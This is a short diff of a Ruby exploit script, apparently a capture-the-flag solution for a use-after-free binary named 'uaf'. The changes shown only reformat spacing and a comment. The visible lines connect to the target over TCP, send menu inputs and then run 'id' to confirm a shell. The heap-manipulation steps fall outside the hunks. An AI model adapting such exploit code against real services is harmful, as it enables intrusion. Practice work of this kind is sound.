@@ -3,11 +3,11 @@
 require 'heapinfo'
 require 'socket'
 $HOST, $PORT = '', 12345
-$local=false
-($HOST = '0'; $local=true) if ARGV.empty?
+$local = false
+($HOST = '0'; $local = true) if ARGV.empty?
 z=TCPSocket.new $HOST, $PORT
 h = heapinfo('./uaf')
-#============================exploit start!================================
+# ==================== Exploit Start ==================== #
 z.puts 1 # new Benz
 
 h.debug {
@@ -34,4 +34,3 @@ z.puts 3
 sleep 0.1
 z.puts 'id'
 puts z.gets
-
